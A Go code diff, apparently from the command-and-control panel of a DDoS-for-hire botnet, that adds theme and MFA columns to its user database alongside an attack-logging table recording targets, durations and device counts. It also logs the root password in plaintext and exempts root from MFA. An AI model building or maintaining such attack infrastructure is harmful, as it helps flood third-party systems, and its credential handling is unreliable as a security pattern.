@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"log"
 	"math/rand"
+	"strings"
 	"time"
 
 	_ "github.com/mattn/go-sqlite3"
@@ -13,7 +14,7 @@ import (
 
 var (
 	SQL *sql.DB = new(sql.DB)
-	err error = nil // Temp
+	err error   = nil // Temp
 )
 
 // SpawnSQL will open the SQL containing information about the user,attacks & logins.
@@ -29,7 +30,8 @@ func SpawnSQL() error {
 
 	for item, format := range Spawn {
 		if s, err := SQL.Query("SELECT * FROM `" + item + "`"); err == nil && s != nil {
-			s.Close(); continue
+			s.Close()
+			continue
 		}
 
 		statement, err := SQL.Prepare(format)
@@ -51,7 +53,7 @@ func SpawnSQL() error {
 			}
 
 			// Querys the insert into the SQL database
-			if s, err := SQL.Exec("INSERT INTO `users` (`username`,`password`,`admin`,`api`,`reseller`,`newuser`,`maxtime`,`cooldown`,`conns`,`max_daily`,`expiry`) VALUES ('root', ?, 1,1,0,1,800,30,2,50, ?);", Password, time.Now().Add(1000 * 24 * time.Hour).Unix()); err == nil && s != nil {
+			if s, err := SQL.Exec("INSERT INTO `users` (`username`,`password`,`admin`,`api`,`reseller`,`newuser`,`maxtime`,`cooldown`,`conns`,`max_daily`,`expiry`,`theme`,`mfa`,`mfa_secret`) VALUES ('root', ?, 1,1,0,1,800,30,2,50, ?, ?, 0, '');", Password, time.Now().Add(1000*24*time.Hour).Unix(), defaultThemeName); err == nil && s != nil {
 				log.Printf("\x1b[48;5;10m\x1b[38;5;16m Success \x1b[0m User inserted! ('root':'%s')", Password)
 				continue
 			} else {
@@ -60,24 +62,99 @@ func SpawnSQL() error {
 		}
 	}
 
+	if err := ensureUsersColumns(); err != nil {
+		return err
+	}
+
 	return nil
 }
 
 // spawn will hold all the tables which are used inside the database like User,Attack & Logins.
 var Spawn map[string]string = map[string]string{
-	"users": "CREATE TABLE `users` (`id` INTEGER PRIMARY KEY AUTOINCREMENT,`username` TEXT NOT NULL,`password` TEXT NOT NULL,`admin` INTEGER NOT NULL,`reseller` INTEGER NOT NULL,`newuser` INTEGER NOT NULL,`api` INTEGER NOT NULL,`maxtime` INTEGER NOT NULL,`cooldown` INTEGER NOT NULL,`conns` INTEGER NOT NULL,`max_daily` INTEGER NOT NULL,`expiry` INTEGER NOT NULL);",
+	"users":   "CREATE TABLE `users` (`id` INTEGER PRIMARY KEY AUTOINCREMENT,`username` TEXT NOT NULL,`password` TEXT NOT NULL,`admin` INTEGER NOT NULL,`reseller` INTEGER NOT NULL,`newuser` INTEGER NOT NULL,`api` INTEGER NOT NULL,`maxtime` INTEGER NOT NULL,`cooldown` INTEGER NOT NULL,`conns` INTEGER NOT NULL,`max_daily` INTEGER NOT NULL,`expiry` INTEGER NOT NULL,`theme` TEXT NOT NULL DEFAULT 'default',`mfa` INTEGER NOT NULL DEFAULT 1,`mfa_secret` TEXT NOT NULL DEFAULT '');",
 	"attacks": "CREATE TABLE `attacks` (`target` TEXT NOT NULL,`duration` INTEGER NOT NULL,`flags` TEXT NOT NULL,`sent` INTEGER NOT NULL,`finish` INTEGER NOT NULL,`user` TEXT NOT NULL,`devices` INTEGER NOT NULL);",
 }
 
+func ensureUsersColumns() error {
+	rows, err := SQL.Query("PRAGMA table_info(`users`)")
+	if err != nil {
+		return err
+	}
+	defer rows.Close()
+
+	hasTheme := false
+	hasMFA := false
+	hasMFASecret := false
+	for rows.Next() {
+		var (
+			cid       int
+			name      string
+			dataType  string
+			notNull   int
+			defaultV  sql.NullString
+			primaryPK int
+		)
+		if err := rows.Scan(&cid, &name, &dataType, &notNull, &defaultV, &primaryPK); err != nil {
+			return err
+		}
+		if strings.EqualFold(name, "theme") {
+			hasTheme = true
+		}
+		if strings.EqualFold(name, "mfa") {
+			hasMFA = true
+		}
+		if strings.EqualFold(name, "mfa_secret") {
+			hasMFASecret = true
+		}
+	}
+
+	if !hasTheme {
+		if _, err := SQL.Exec("ALTER TABLE `users` ADD COLUMN `theme` TEXT NOT NULL DEFAULT 'default'"); err != nil {
+			return err
+		}
+	}
+
+	addedMFA := false
+	if !hasMFA {
+		if _, err := SQL.Exec("ALTER TABLE `users` ADD COLUMN `mfa` INTEGER NOT NULL DEFAULT 1"); err != nil {
+			return err
+		}
+		addedMFA = true
+	}
+
+	if !hasMFASecret {
+		if _, err := SQL.Exec("ALTER TABLE `users` ADD COLUMN `mfa_secret` TEXT NOT NULL DEFAULT ''"); err != nil {
+			return err
+		}
+	}
+
+	if _, err := SQL.Exec("UPDATE `users` SET `theme` = ? WHERE `theme` IS NULL OR TRIM(`theme`) = ''", defaultThemeName); err != nil {
+		return err
+	}
+
+	// Root should always be exempt from MFA.
+	if _, err := SQL.Exec("UPDATE `users` SET `mfa` = 0, `mfa_secret` = '' WHERE `username` = 'root'"); err != nil {
+		return err
+	}
+
+	// First-time migration: enforce MFA for every non-root account.
+	if addedMFA {
+		if _, err := SQL.Exec("UPDATE `users` SET `mfa` = 1 WHERE `username` <> 'root'"); err != nil {
+			return err
+		}
+	}
+
+	return nil
+}
 
 // AttackLogs are saved to the database
 type AttackLog struct {
 	Target   string
 	Duration int
-	Flags	 string
-	Sent	 int64
-	Finish	 int64
-	User 	 string
+	Flags    string
+	Sent     int64
+	Finish   int64
+	User     string
 	Devices  int
 }
 
@@ -89,40 +166,64 @@ func LogAttack(log *AttackLog) error {
 
 // User format structure for queries
 type User struct {
-	ID 		 int
-	Username string
-	Password string
-	Admin 	 bool
-	Maxtime  int
-	Cooldown int
-	Conns    int
-	API	 	 bool
-	NewUser  bool
-	Reseller bool
-	MaxDaily int
-	Expiry   int64
+	ID        int
+	Username  string
+	Password  string
+	Admin     bool
+	Maxtime   int
+	Cooldown  int
+	Conns     int
+	API       bool
+	NewUser   bool
+	Reseller  bool
+	MaxDaily  int
+	Expiry    int64
+	Theme     string
+	MFA       bool
+	MFASecret string
 }
 
 // FindUser will try to find the user inside the database.
 func FindUser(username string) (*User, error) {
-    statement, err := SQL.Prepare("SELECT `id`,`username`,`password`,`admin`, `api`,`reseller`,`newuser`,`maxtime`,`cooldown`,`conns`,`max_daily`,`expiry` FROM `users` WHERE `username` = ?")
-    if err != nil {
-        return nil, err
-    }
+	statement, err := SQL.Prepare("SELECT `id`,`username`,`password`,`admin`, `api`,`reseller`,`newuser`,`maxtime`,`cooldown`,`conns`,`max_daily`,`expiry`,`theme`,`mfa`,`mfa_secret` FROM `users` WHERE `username` = ?")
+	if err != nil {
+		return nil, err
+	}
 
-    defer statement.Close()
+	defer statement.Close()
 
-    var u *User = new(User)  // Rename variable to avoid naming conflict
-    query := statement.QueryRow(username)
-    if err := query.Scan(&u.ID, &u.Username, &u.Password, &u.Admin, &u.API, &u.Reseller, &u.NewUser, &u.Maxtime, &u.Cooldown, &u.Conns, &u.MaxDaily, &u.Expiry); err != nil {
-        return nil, err
-    }
+	var u *User = new(User) // Rename variable to avoid naming conflict
+	query := statement.QueryRow(username)
+	if err := query.Scan(&u.ID, &u.Username, &u.Password, &u.Admin, &u.API, &u.Reseller, &u.NewUser, &u.Maxtime, &u.Cooldown, &u.Conns, &u.MaxDaily, &u.Expiry, &u.Theme, &u.MFA, &u.MFASecret); err != nil {
+		return nil, err
+	}
+	if strings.TrimSpace(u.Theme) == "" {
+		u.Theme = defaultThemeName
+	}
+	if strings.EqualFold(u.Username, "root") {
+		u.MFA = false
+		u.MFASecret = ""
+	}
 
-    return u, nil
+	return u, nil
 }
+
 // CreateUser will attempt to create a new user inside the database.
 func CreateUser(user *User) error {
-	_, err := SQL.Exec("INSERT INTO `users` (`username`,`password`,`admin`,`api`,`reseller`,`newuser`,`maxtime`,`cooldown`,`conns`,`max_daily`,`expiry`) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)", user.Username, user.Password, user.Admin, user.API, user.Reseller, user.NewUser, user.Maxtime, user.Cooldown, user.Conns, user.MaxDaily, user.Expiry)
+	theme := strings.TrimSpace(user.Theme)
+	if theme == "" {
+		theme = defaultThemeName
+	}
+	mfa := user.MFA
+	if !strings.EqualFold(user.Username, "root") {
+		mfa = true
+	}
+	secret := strings.TrimSpace(user.MFASecret)
+	if strings.EqualFold(user.Username, "root") {
+		mfa = false
+		secret = ""
+	}
+	_, err := SQL.Exec("INSERT INTO `users` (`username`,`password`,`admin`,`api`,`reseller`,`newuser`,`maxtime`,`cooldown`,`conns`,`max_daily`,`expiry`,`theme`,`mfa`,`mfa_secret`) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)", user.Username, user.Password, user.Admin, user.API, user.Reseller, user.NewUser, user.Maxtime, user.Cooldown, user.Conns, user.MaxDaily, user.Expiry, theme, mfa, secret)
 	return err
 }
 
@@ -134,7 +235,7 @@ func ModifyField(user *User, field string, value interface{}) error {
 
 // GetUsers will fetch all the users inside the database
 func GetUsers() ([]*User, error) {
-	users, err := SQL.Query("SELECT `id`,`username`,`password`,`admin`, `api`,`reseller`,`newuser`,`maxtime`,`cooldown`,`conns`,`max_daily`,`expiry` FROM `users`")
+	users, err := SQL.Query("SELECT `id`,`username`,`password`,`admin`, `api`,`reseller`,`newuser`,`maxtime`,`cooldown`,`conns`,`max_daily`,`expiry`,`theme`,`mfa`,`mfa_secret` FROM `users`")
 	if err != nil {
 		return make([]*User, 0), err
 	}
@@ -144,8 +245,15 @@ func GetUsers() ([]*User, error) {
 	defer users.Close()
 	for users.Next() {
 		var account *User = new(User)
-		if err := users.Scan(&account.ID, &account.Username, &account.Password, &account.Admin, &account.API, &account.Reseller, &account.NewUser, &account.Maxtime, &account.Cooldown, &account.Conns, &account.MaxDaily, &account.Expiry); err != nil {
+		if err := users.Scan(&account.ID, &account.Username, &account.Password, &account.Admin, &account.API, &account.Reseller, &account.NewUser, &account.Maxtime, &account.Cooldown, &account.Conns, &account.MaxDaily, &account.Expiry, &account.Theme, &account.MFA, &account.MFASecret); err != nil {
 			return make([]*User, 0), err
+		}
+		if strings.TrimSpace(account.Theme) == "" {
+			account.Theme = defaultThemeName
+		}
+		if strings.EqualFold(account.Username, "root") {
+			account.MFA = false
+			account.MFASecret = ""
 		}
 
 		Users = append(Users, account)
